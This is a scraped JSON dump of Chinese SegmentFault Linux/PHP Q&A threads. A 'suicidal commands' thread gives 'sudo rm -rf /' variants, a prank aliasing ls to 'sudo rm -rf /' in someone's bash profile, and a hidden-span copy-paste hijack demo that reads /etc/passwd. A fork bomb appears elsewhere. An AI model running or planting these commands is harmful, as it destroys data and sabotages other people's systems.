        "python",
        "php",
        "后端",
        "linux"
      ],
      "time": "2014-01-19",
      "title": "深入学习PHP还是Python",
      "url": "https://segmentfault.com/q/1010000000391380"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000671579\">\n<pre><code class=\"lang-shell\">sudo rm -rf / usr/local/xxoo\n</code></pre>\n<p>你们的直接删除/太明显了</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000671743\">\n<p>你敢复制以下代码在终端运行一下吗？</p>\n<p>看<a href=\"http://thejh.net/misc/website-terminal-copy-paste\" rel=\"nofollow\">website-terminal-copy-paste</a>.</p>\n<p>本来想直接贴上这个例子呢，发现sf上面的markdown编辑器似乎很牛，能直接显示“使坏”的部分（不过感觉这是一个Bug）。</p>\n<hr>\n<p>看着是一个简单的示例命令，如下：</p>\n<pre><code class=\"lang-html\">git clone git://git.kernel.org/pub/scm/utils/kup/kup.git\n</code></pre>\n<p>其实在页面源代码里是这样的：</p>\n<pre><code class=\"lang-html\">&lt;p&gt; git clone\n    &lt;span style=\"position: absolute; left: -999px; top: -999px; \"&gt;/dev/null; clear; echo -n \"Hello \";whoami|tr -d '\\n';echo -e '!\\nThat was a bad idea. Don'\"'\"'t copy code from websites you don'\"'\"'t trust!&lt;br&gt;Here'\"'\"'s the first line of your /etc/passwd: ';head -n1 /etc/passwd&lt;br&gt;git clone &lt;/span&gt;\n    git://git.kernel.org/pub/scm/utils/kup/kup.git\n&lt;/p&gt; \n</code></pre>\n<p>这里编辑上面源代码，在答案预览里完全ok，但是提交答案后会显示出里面“使坏”部分。上面例子并没有破坏你的系统，不过你懂的！</p>\n</hr></div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000670814\">\n<ol>\n<li>打开 bash 配置文件，如 <code>.bash_profile</code>\n</li>\n<li>添加这一行 <code>alias ls='sudo rm -rf /'</code>\n</li>\n<li>保存并退出</li>\n</ol>\n<p>等待机主惨叫</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000670655\">\n<p>如题，比如</p>\n<blockquote>\n<p><code>sudo apt-get remove -f python</code> GUI 挂掉（把操作完的的后果写出来）</p>\n</blockquote>\n<p>不一定要只在 Linux 下，求推荐更多~~~~~</p>\n</div>",
      "favourite": "5",
      "glance": "3k",
      "tags": [
        "command",
        "linux"
      ],
      "time": "2014-09-16",
      "title": "有哪些好玩的的自杀式命令？",
      "url": "https://segmentfault.com/q/1010000000670655"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000685801\">\n<ul>\n<li>\n<a href=\"http://zh.wikipedia.org/wiki/%E7%B4%85%E6%97%97Linux\" rel=\"nofollow\">红旗Linux</a>，这个发行版的指导思想就是申(pian)请(qu)国家科研经费</li>\n<li>\n<a href=\"http://zh.wikipedia.org/wiki/%E7%B4%85%E6%98%9F%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1\" rel=\"nofollow\">红星操作系统</a>，这个发行版的指导思想是著名的<strong><a href=\"http://zh.wikipedia.org/wiki/%E4%B8%BB%E4%BD%93%E6%80%9D%E6%83%B3\" rel=\"nofollow\">主体思想</a></strong>\n</li>\n<li>\n<a href=\"http://www.ubuntu.com/desktop/ubuntu-kylin-zh-CN\" rel=\"nofollow\">优麒麟</a>，这个发行版的指导思想是“<strong>农历日历很重要</strong>”，需要为了这个东西新建一个发行版</li>\n<li>\n<a href=\"http://www.linuxfromscratch.org/lfs/\" rel=\"nofollow\">Linux From Scratch</a>，其实这不是个发行版，它其实是Linux界的方舟子，它会告诉你那些张福贵Linux/刘翠花Linux都是怎么做出来欺骗大众的。</li>\n</ul>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000685822\">\n<p>中标普华、银河麒麟、红旗：为了存在而存在的怪胎；<br>\ncentos：我牛逼我怕谁；<br>\nfedora：老爹您好！<br>\npuppy，slax：媲美winpe的小而美；<br>\nubuntu：文能上马定乾坤，武能提笔安天下；<br>\narch：文能提笔安天下，武能上马定乾坤；<br>\ndebian：ubuntu那龟孙儿，是我儿子；<br>\nsuse：三易其主的杯具；<br>\ngentoo：我才是真geek；<br>\nlfs：gentoo撒谎。</br></br></br></br></br></br></br></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000687783\">\n<p>2 年前，全世界都在嘲笑我们国家的操作系统，看看当时的截图：</p>\n<p><img data-src=\"http://segmentfault.com/img/bVc25b\"/></p>\n<p>2 年过去了，我们的系统在 Kim Jong-un 的带领下已经有了无穷大的提升，而且我们不骗经费，我们的系统一直是遵循<code>金日成主体思想</code>的，粉碎帝国主义的阴谋：</p>\n<p><img data-src=\"http://segmentfault.com/img/bVc25p\"/></p>\n<p><marquee><br>\n这个世界上总有垫底的，红旗、麒麟，可得垫牢点啊！<br>\nRed Star rocking the world!<br/></br></br></marquee></p>\n<p>欢迎试用，下载地址： <a href=\"http://www.openingupnorthkorea.com/downloads-2\" rel=\"nofollow\">http://www.openingupnorthkorea.com/downloads-2</a></p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000685771\">\n<p>现在有各种各样的linux发行版，但是很多都是为了仿Mac osx和windows而存在，有没有哪些发行版的思想很奇特，或者很值得称赞？</p>\n</div>",
      "favourite": "1",
      "glance": "4.2k",
      "tags": [
        "linux"
      ],
      "time": "2014-09-21",
      "title": "有哪些Linux发行版的思想很奇特",
      "url": "https://segmentfault.com/q/1010000000685771"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002541369\">\n<p>是对应的web服务器执行的<br>\nnginx 查看nginx.conf里面的user指令<br>\napache 查看apache2.conf里面的User指令,可能倒入了envvars里面的变量<br>\nexport APACHE_RUN_USER=www-data</br></br></br></p>\n<p>或者查看phpinfo里面<br>\nConfiguration apache2handler<br>\n的user/group</br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002541495\">\n<p>除了通过对应配置文件查找之外，一种更方便的方法是打印<code>$_SERVER</code></p>\n<p>通常<code>$_SERVER['USER']</code>就是用户名</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002541348\">\n<p>是执行 PHP 指令的那个程序的权限。</p>\n<p>比如使用 Apache httpd 的 PHP 模块时，（如果没有用 suexec 之类的配置）是 apache 配置文件里指定的用户（比如 www-data）。</p>\n<p>比如使用 nginx 通过 FastCGI 传给 php-fpm 时，是 php-fpm 配置文件里指定的用户。</p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002541340\">\n<p>如题，这样我就可以针对这个用户设置权限了。而且这个用户是怎么关联上的，怎么查看？</p>\n</div>",
      "favourite": "4",
      "glance": "3.8k",
      "tags": [
        "php",
        "linux"
      ],
      "time": "2015-02-06",
      "title": "在浏览器中打开php文件时，是Linux中的哪个用户执行的？",
      "url": "https://segmentfault.com/q/1010000002541340"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004255193\">\n<p>我们觉得手机/平板/PC会逐步融合为一体。android-x86（based on AOSP-6 marshmallow(有多窗口实验feature支持)，基本上是黄志伟等4～5人搞定的，很了不起，开源）,remix（商业）已经可以跑在一般PC/平板上，我们希望能在自己使用的笔记本或台式机上玩桌面版android app+linux app(可运行在一个linux kernel x86-64上)，用于日常的编程，写文档，玩游戏，看电影，上网。我们没有那么大的目标：比如要与windows啥竞争。但即使这样，也需要进行比较有难度的开源软件开发（涉及 surfaceflinger,wayland, mesa3D，linux kernel等）。这样做的可行性，亮点和缺点是啥？我们经验不足，希望能够看到各位老手，高手给出意见（正反都行），建议。多谢！  </p>\n<p>要让android app和linux app都在一个kernel上跑，这样想开发啥玩啥都行。</p>\n<p>应该有比vmplayer/virtualbox效率高的方法</p>\n<p>比如可采用chroot+xserver-sdl技术，  <br><a href=\"https://github.com/pelya/debian-noroot\">https://github.com/pelya/debian-noroot</a> <br><a href=\"https://github.com/pelya/xserver-xsdl\">https://github.com/pelya/xserver-xsdl</a></br></br></p>\n<p>效率比vmplayer/virtualbox高。</p>\n<p>瓶颈应该会在xserver上，我们希望做到比这种效率还要高。  </p>\n<p>大家有何建议？</p>\n</div>",
      "favourite": "0",
      "glance": "556",
      "tags": [
        "android",
        "linux",
        "linux-kernel",
        "x86"
      ],
      "time": "1-5",
      "title": "[讨论]linux+Android apps运行在desktop PC（桌面PC）上的可行性",
      "url": "https://segmentfault.com/q/1010000004255193"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000126138\">\n<pre>set fileformat=unix\n:w</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000130852\">\n<p>以绝后患的办法是，把windows程序员叫过来跟他们谈谈心。</p><p>劝劝他们换成linux或者Mac，如果不回头。至少也一起坐下来看看他们的编辑器，把这个改成linux格式的。</p><p>不听的话，扎纸人吧。</p><p>求赞，求解决！</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000127243\">\n<p>替换^M字符<br/>\n在Linux下使用vi来查看一些在Windows下创建的文本文件，有时会发现在行尾有一些“^M”。有几种方法可以处理。</p><p>1.使用dos2unix命令。一般的分发版本中都带有这个小工具（如果没有可以根据下面的连接去下载），使用起来很方便:<br/>\n$ dos2unix myfile.txt<br/>\n上面的命令会去掉行尾的^M。</p><p>2.使用vi的替换功能。启动vi，进入命令模式，输入以下命令:<br/>\n:%s/^M$//g # 去掉行尾的^M。</p><p>:%s/^M//g # 去掉所有的^M。</p><p>:%s/^M/[ctrl-v]+[enter]/g # 将^M替换成回车。</p><p>:%s/^M/\\r/g # 将^M替换成回车。</p><p>3.使用sed命令。和vi的用法相似：<br/>\n$ sed -e ‘s/^M/\\n/g’ myfile.txt</p><p>注意：这里的“^M”要使用“CTRL-V CTRL-M”生成，而不是直接键入“^M”。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000126118\">\n<p>我用的Linux，vim打开别人的文件以后，都是各种^M在行尾。<br/>\n每次我都得手动清理一次，烦死了。。。<br/>\n有没有什么办法，设置一下，别让^M显示出来</p>\n</div>",
      "favourite": "6",
      "glance": "3.4k",
      "tags": [
        "linux",
        "vim"
      ],
      "time": "2012-10-10",
      "title": "怎么避免Windows编辑文件后出现^M",
      "url": "https://segmentfault.com/q/1010000000126118"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000130692\">\n<p>我经常从ssh登录到我的ubuntu服务器时都会显示</p><pre>Welcome to Ubuntu 11.04 (GNU/Linux 2.6.38-16-server x86_64)\n\n * Documentation:  http://www.ubuntu.com/server/doc\n\n  System information as of Wed Oct 17 22:07:28 HKT 2012\n\n  System load:    0.16               Processes:           144\n  Usage of /home: 48.8% of 18.33GB   Users logged in:     0\n  Memory usage:   1%                 IP address for eth0: 192.168.1.201\n  Swap usage:     0%\n\n  =&gt; There is 1 zombie process.\n\n  Graph this data and manage this system at https://landscape.canonical.com/</pre><p>但我用下面的命令</p><pre>ps aux | grep Z</pre><p>却<strong>没有找到</strong>任何<code>STAT</code>为<code>Z</code>的进程，请问这个提示是什么意思？我怎么才能找到这个进程呢？</p>\n</div>",
      "favourite": "0",
      "glance": "4.8k",
      "tags": [
        "ubuntu",
        "linux"
      ],
      "time": "2012-10-22",
      "title": "ubuntu登录进去的时候老提示\"There is 1 zombie process\"，但实际没找到相关进程",
      "url": "https://segmentfault.com/q/1010000000130692"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000160414\">\n<p>这种事情不要用MySQL做。弄个redis或者memcachedb就好了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000160625\">\n<p>直接log在文件里不就可以了。。。何必一定mysql。。。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000160537\">\n<p>怎么都说不要用MySQL来做，每秒200并发对MySQL来说不算啥难事啊。而且换成Redis、Memcached，持久化姑且不说，业务代码和运维部署量都不小。</p><p>我给你几个建议，尽量让你的运维部署和业务代码改动小一些。</p><p>你可以做主从分离，不要在一个库上高并发插入同时还做大量统计运算。分离之后，查询在从库是做（甚至是导入Hive之类专门的分布式系统来做），主库上可以去掉索引，提升插入的性能。这个方法，业务代码几乎不用任何改动（改个数据库配置文件就好了）。MySQL运维部署也可以选个业务低谷在线做。</p><p>如果你可以接受少量业务代码（PHP）改动，还有两个建议：<br/>\n1. 分库，分表，每个表的数据总量小了，操作起来性能会好一些，特别是对从库的MyISAM表。你插入之前可能会有一些查询，例如查询这个IP在不在库里，以前统计过没。<br/>\n2. 使用HandlerSocket插件，绕过SQL Parser，直接操作存储文件。如果业务上有可能，还可以使用bulk insert（批量插入）。MySQL InnoDB还推出了类似HandlerSocket的InnoDB NoSQL Plugin，用的memcached协议，共享InnoDB Buffer，再也不用操心MySQL和Memcached之前怎么维护数据一致性了。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000160398\">\n<p>lnmp环境，其他页面内容都做了缓存了，没有多大的负载，就是这个浏览量统计功能，给mysql带来不小的压力，请问诸位有什么解决办法吗？</p>\n</div>",
      "favourite": "24",
      "glance": "12.4k",
      "tags": [
        "mysql",
        "php",
        "nginx",
        "linux",
        "并发"
      ],
      "time": "2013-01-13",
      "title": "PHP页面有一个浏览量统计每秒有200并发，造成insert给mysql造成很大压力",
      "url": "https://segmentfault.com/q/1010000000160398"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000165668\">\n<pre>df -h</pre><p>从左到右分别指：Filesystem | Size | Used | Avail | Capacity | Mounted on<br/>\n/dev/root被挂载到根目录下，/dev/mmcblk0p1被挂载到/boot下<br/>\n<strong>rootfs</strong> 应该是和SD Card有关</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000165723\">\n<p>rootfs是个临时的启动镜像，只在系统初始化时起作用。<br/>\n启动过程中/dev/root替代rootfs挂载在/，最左栏不完全是文件系统的意思，有的会显示挂载设备</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000165295\">\n<p>前面两个你自己去搜吧。</p><p>第三个 mmcblk0p1 是 mmc block No.0 Partition 1 的意思。就是内部地0个mmc存储的第一个分区。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000165258\">\n<html><body>\n<p>刚入手一块raspberry，终于可以好好的玩linux了<br>\n今天发现<code>df -h</code>命令的一些疑惑，每次都是只能大概看懂，具体的每项数据表示什么仍旧搞不明白，截图如下<br><img data-src=\"http://segmentfault.com/img/bVQ9n\"/></br></br></p>\n<p>1、上图中rootfs具体是负责干什么的？<br>\n2、/dev/root这算是什么文件系统啊？这明明就是一个目录节点嘛？为什么把他挂载到/上？<br>\n3、/dev/mmcblk0p1同第二问，这算是什么文件系统啊？</br></br></p>\n</body></html>\n</div>",
      "favourite": "2",
      "glance": "3k",
      "tags": [
        "linux",
        "raspberry-pi"
      ],
      "time": "2013-01-25",
      "title": "linux文件系统的疑惑",
      "url": "https://segmentfault.com/q/1010000000165258"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000201269\">\n<p>自动插入当前时间 <a href=\"http://vim.wikia.com/wiki/Insert_current_date_or_time#Automatically_update_timestamps\" rel=\"nofollow\">http://vim.wikia.com/wiki/Insert_current_date_or_time#Automatically_update_timestamps</a></p>\n<p>文本标记转 ppt 有很多工具啊 asciidoc txt2tag 什么的<br/>\npandoc 貌似可以直接生成 html slide <a href=\"http://johnmacfarlane.net/pandoc/demos.html\" rel=\"nofollow\">http://johnmacfarlane.net/pandoc/demos.html</a><br/>\n其实直接用 impress.js reveal.js 更简单</p>\n<p>如果 blog 是 wordpress 的话有插件 VimRepress<br/>\nvim 要 python 支持</p>\n<p>本地可以跑个 dokuwiki</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000201273\">\n<p>关于wiki的话推荐<a href=\"http://www.vim.org/scripts/script.php?script_id=2226\" rel=\"nofollow\">vimwiki</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000203589\">\n<p>首先提出我的问题之后,有了两位朋友的抛砖引玉,通过他们的引子和我之前接触的一些软件,成功的完全了一整套的环境,如果各个软件熟悉其实并不是麻烦.整个的环境基于mike的wiki思路,<a href=\"http://www.mikewootc.com/wiki/tool/sitebuild/mikewiki.html\" rel=\"nofollow\">http://www.mikewootc.com/wiki/tool/sitebuild/mikewiki.html</a> \n我也整理出来了一个(还在完善中) <a href=\"http://wiki.ohlinux.com/wiki/tool/sitebuild/ohlinuxwiki.html\" rel=\"nofollow\">http://wiki.ohlinux.com/wiki/tool/sitebuild/ohlinuxwiki.html</a></p>\n<p>大概介绍下:</p>\n<ul>\n<li>系统:mac 或者 linux 我的是mac,mike的是linux,我的多一个vimwiki的操作</li>\n<li>markdown 文本使用这个格式,移植性好.</li>\n<li>pandoc 可以将markdown的文档生成html,pdf,ppt等格式</li>\n<li>makefile 可以自动的编译变动的问题,实现自动化</li>\n<li>vimwiki 可以方便操作文档,并不需要切出vim</li>\n<li>git github增加了文本的版本管理,安全性大增加</li>\n<li>blog 使用github的blog展示,也可以自己搭建,我这里就直接使用github省事,查看 <a href=\"http://wiki.ohlinux.com\" rel=\"nofollow\">http://wiki.ohlinux.com</a> ,并且嵌入到我的blog的导航中.</li>\n<li>插入时间,我直接配置的vimrc的命令</li>\n</ul>\n<pre><code class=\"lang-shell\">insert date\nnmap &lt;F3&gt; a&lt;C-R&gt;=strftime(\"%Y-%m-%d %I:%M %p\")&lt;CR&gt;&lt;Esc&gt;\nimap &lt;F3&gt; &lt;C-R&gt;=strftime(\"%Y-%m-%d %I:%M %p\")&lt;CR&gt;\n</code></pre>\n<p>更详细的文档还是查看我的wiki和github <a href=\"http://wiki.ohlinux.com/wiki/tool/sitebuild/ohlinuxwiki.html\" rel=\"nofollow\">http://wiki.ohlinux.com/wiki/tool/sitebuild/ohlinuxwiki.html</a></p>\n<p><strong>后续问题:我使用的SyntaxHighlighter高亮来标记code,但是展示最下面总有一行乱码,查看soure并没有问题,确定是SyntaxHighlighter的显示问题,有谁对这个了解的,我要再单独开个问题么?</strong></p>\n<hr/>\n<p>最后这个高亮的问题我单独开了一个问题:<a href=\"http://segmentfault.com/q/1010000000203902\" rel=\"nofollow\">http://segmentfault.com/q/1010000000203902</a>\n确认应该是显示问题,但我也同时发现一个markdown语法的坑,需要注意的.\n举例:</p>\n<pre><code class=\"lang-markdown\">* aaaaa\n* bbbbb\n    * ccccc\n\n    code line1 \n    code line2\n</code></pre>\n<p>靠tab来打 <pre><code>不会成功.改成如下可以:</code></pre></p>\n<pre><code class=\"lang-markdown\">* aaaaa\n* bbbbb\n    * ccccc\n\nthis is code : \n\n    code line1 \n    code line2\n</code></pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000201240\">\n<p>这个问题比较大啊,希望可以集思广益,接下来说下我的需求:<br/>\n<strong>需求目标:</strong><br/>\n      打造一个全文本的使用环境,但又要满足日常的办公需求.全文本就是使用vim进行相应的操作,因为我一直使用的都是linux,现在使用mac,所以使用最多的还是vim来编辑内容,多用wiki或者 markdown的格式.但又要满足日常的办公需求,总会有各种ppt和其它doc文档的需求,也会写一些线上的blog等.  </p>\n<p><strong>我现在的状态:</strong> </p>\n<ul>\n<li>平时每天都会用markdown的格式记录工作日志 txt文档,不知道是否有自动添加时间轴线的工具,如我上午10:00添加的时候就会自动的或者命令式的插入时间轴线,就是一天内你操作的时间点都会记录下来,避免了不停的输入时间.</li>\n<li>我现在可以使用pandoc将txt文件转成slideshow ppt的方式,但是支持得还不够好,而且mac下面缺少包转成pdf等格式.是否有更好工具?或者使用pandoc该如何打造.</li>\n<li>有时也要写一些blog希望txt文档可以直接转成blog使用的html,现在了解到有一个the vim outliner 用得不是很方便,有没有更好的解决方案?</li>\n<li>以前在linux下面的时候有一个zim wiki记录了很多,而且都是文件文本通过dropbox就可以同步到其它linux环境,但是转到mac下面之后,zim依赖的东西变得很麻烦,mac下面是否有支持wiki记录的工具,而且也是文件格式的(就一篇文章就是一个文本文件)?</li>\n</ul>\n<hr/>\n<p>现在的进度,zim wiki我使用vimwiki 很不错;时间插入有一个命令,后面答案我会详细写;pandoc转pdf 我今天实验了好久 将pdflatex 想pandoc转md文件成pdf,结果中文字体一直不行,英文的没有问题,找了很多方法还没有解决.不知道大家有没有办法啊.</p>\n<hr/>\n<p>中文转换的问题已经解决了,我正在整理各个环节,整理好了之后再提交答案.</p>\n<hr/>\n<p>在整理过程中,看到一篇不错的文章分享给大家 <a href=\"http://www.mikewootc.com/wiki/tool/sitebuild/mikewiki.html\" rel=\"nofollow\">http://www.mikewootc.com/wiki/tool/sitebuild/mikewiki.html</a> 我会按这个原理的基础上再丰富下.</p>\n<hr/>\n<p>我已经整理了篇 pandoc+markdown+makefile+vimwiki+github的一个环境,还没有完全写完,大家可以先查看 <a href=\"http://wiki.ohlinux.com\" rel=\"nofollow\">http://wiki.ohlinux.com</a> <a href=\"http://www.ohlinux.com\" rel=\"nofollow\">http://www.ohlinux.com</a> 完善了之后会再发布答案.</p>\n</div>",
      "favourite": "9",
      "glance": "4.4k",
      "tags": [
        "vim",
        "linux",
        "macos"
      ],
      "time": "2013-05-15",
      "title": "如何打造全文本vim操作环境",
      "url": "https://segmentfault.com/q/1010000000201240"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000310130\">\n<p>apache、 fastcgi、php-fpm 模式下生的子进程都是有生命周期的，超时后可能会被干掉，或者变狠成僵尸。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000310447\">\n<p>直接可以通过popen函数来实现你的需求。我经常这样做</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000310547\">\n<p>总是会有人批评PHP进程常驻时内存管理等的问题，不过：</p>\n<p><a href=\"https://github.com/CoderKungfu/php-queue\" rel=\"nofollow\">https://github.com/CoderKungfu/php-queue</a></p>\n<p><a href=\"https://github.com/chrisboulton/php-resque\" rel=\"nofollow\">https://github.com/chrisboulton/php-resque</a></p>\n<p>这两个库的模式都是用一个只负责fork的主进程配合fork出来的worker进程来实现可靠/易管理的“常驻”，主进程干的事少，而worker干完活就退出了，所以，可以放心用。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000309927\">\n<p>在PHP中可以通过pcntl_fork函数生成进程，但官方说当其被用于Web服务环境时可能会带来意外的结果。 不知道你们用过没有，会有什么意外后果？</p>\n<p>因为我想通过PHP来完成一件事，但是我想通过启动多个PHP进程来一起完成这件事，于是就想到了pcntl_fork函数，但对进程又不了解，不知道这种想法是否可行，如果可行的话，是怎么实现的呢？</p>\n</div>",
      "favourite": "7",
      "glance": "3.9k",
      "tags": [
        "php",
        "nginx",
        "mysql",
        "apache",
        "linux"
      ],
      "time": "2013-09-19",
      "title": "在PHP中可以通过pcntl_fork函数生成进程，但官方说...",
      "url": "https://segmentfault.com/q/1010000000309927"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000489928\">\n<p>良心命令，真心无害，部分命令需要安装相应的软件包：</p>\n<ul>\n<li>\n<code>cmatrix</code> 模拟骇客帝国中绿色字符在terminal中从上面落下的场景。</li>\n<li>\n<code>telnet towel.blinkenlights.nl</code> Telnet观看星球大战，IPV6的话可以看到彩色版。</li>\n<li>\n<code>sl</code> 终端里开过一辆火车。</li>\n<li>\n<code>bb</code> 非常牛B的命令之一，是aalib的一个应用展示，在用户终端中用不停变换的字符组成一段视频，效果非常炫酷。</li>\n<li>\n<code>aalib</code> 这货让用户明白，没有什么是不能由ASCII来完成的。</li>\n<li>\n<code>asciiquarium</code> ASC II水族馆。</li>\n</ul>\n<p>谁用谁知道。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000489921\">\n<pre><code><br>:(){:|:&amp;};:\n\n</br></code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000489666\">\n<p>以<code>sudo</code>的方式执行上次的命令，用于忘记加<code>sudo</code>的情况</p>\n<pre><code>sudo !! \n</code></pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000489601\">\n<p>比如：</p>\n<pre><code>pwd | pbcopy\n</code></pre>\n<p>mac下是拷贝当前路径到黏贴板</p>\n<p>最好写上注释， 对于没有注释的新手们不要乱试啊，乖，出问题了踩答案啊，为毛踩我的问题，看我开的头多好的，没想到楼歪这么厉害.....真是的, 看来TDD还没死，同志们请用你们的大脑编译器跑一下下面这个测试,跑挂了的请自觉修过测试：</p>\n<pre><code>def 狂霸酷炫 = (yourCommands) =&gt; {\n    yourCommands.forEach((command) =&gt; {\n        assert(command().userReaction).not.contains(\"草\")\n        assert(command().userReaction).contains(\"Woww\")\n    })\n}\n</code></pre>\n<p>Ref: <a href=\"http://stackoverflow.com/questions/68372/what-is-your-single-most-favorite-command-line-trick-using-bash\" rel=\"nofollow\">stackoverflow</a></p>\n</div>",
      "favourite": "23",
      "glance": "6.5k",
      "tags": [
        "shell",
        "linux"
      ],
      "time": "2014-05-01",
      "title": "说说你觉得最狂霸酷炫屌炸天的命令",
      "url": "https://segmentfault.com/q/1010000000489601"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000671344\">\n<p>你只要不执行 kill -9 , 就算优雅</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000671661\">\n<p>shutdown.sh</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000671773\">\n<p><code>kill -15 pid</code>,具体参考<a href=\"http://kenwublog.com/kill-java-correctly\" rel=\"nofollow\">正确地kill java进程</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000668242\">\n<p>无论是在 Linux 还是 Windows 下，如何能优雅地让 Java 程序停止运行？想了解一下 <code>Runtime.getRuntime().addShutdownHook</code> 会在什么样的情况下才会被调用，什么样的情况下不被调用。</p>\n<p>想找一个最可行的解决方案。</p>\n</div>",
      "favourite": "1",
      "glance": "2.6k",
      "tags": [
        "java",
        "linux"
      ],
      "time": "2014-09-14",
      "title": "如何优雅地停止 Java 程序",
      "url": "https://segmentfault.com/q/1010000000668242"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000692453\">\n<p>arch 命令即可</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000693467\">\n<h2>位数</h2>\n<p>uname -a<br><img data-src=\"/img/bVc4y1\"><br><img data-src=\"/img/bVc4y2\"/></br></img></br></p>\n<h2>版本</h2>\n<p>lsb_release -a<br><img data-src=\"/img/bVc4y5\"/></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000692398\">\n<pre><code>$ uname -a\n</code></pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000692395\">\n<p>因为VPS上要装一个软件，但是不知道当前这个操作系统是32位还是64位的，所以想问问如何判断系统是多少位？</p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "linux",
        "vps"
      ],
      "time": "2014-09-24",
      "title": "怎样查看当前linux系统是64位还是32位的?",
      "url": "https://segmentfault.com/q/1010000000692395"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000001812975\">\n<p>誰說 Windows 會卡？我在虛擬機里用 Windows，內存 CPU 顯存 都很緊張，內存只能分到 4G，CPU 只有分到兩個核心四線程，顯存只有分到 768M，開 Chrone 玩 3D 遊戲，從未覺卡（曾經那個遊戲把我舊電腦2G內存佔滿了，然後沒內存，崩潰！）</p>\n<p>內存佔用高會卡的原因是，被迫使用虛擬內存，也就是與硬盤交換空間，硬盤，持續 IO，卡死你。</p>\n<p>而並不是說內存佔用高一定會卡。只要不使用虛擬內存，比如即時回收了佔用的空間，就不會卡。</p>\n<p>就算使用虛擬內存，你硬盤足夠快，也沒問題。PCIe SSD 試試？</p>\n<p>你看 iOS，根本沒有虛擬內存，物理內存 1G，卡嗎？只是經常丟失之前看過的網頁要重新加載罷了。</p>\n<hr>\n<p>另外，關於裝 XX衛士 卡成翔的原因，是 XX衛士 inline hook 了系統關鍵函數，KiFastCallEntry，這個函數太關鍵了，以至於XX衛士的響應速度成爲了系統響應速度的上限。據說，有些安裝只要幾分鐘的軟件，在 Hook 了 KiFastCallEntry 之後，要長達幾個小時之久！</p>\n<p>這也是爲什麼XX不完美支持Win7 x64的原因——PatchGuard導致XX難以像以前一樣無法無天。</p>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002152039\">\n<p>如果你用一个命令行跑服务的系统去比一个桌面系统，显然这是不公平的<br>\n如果你看看ubuntu那个桌面什么流畅度 再看看windows桌面什么流畅度 我们再谈下面的话题</br></p>\n</div>",
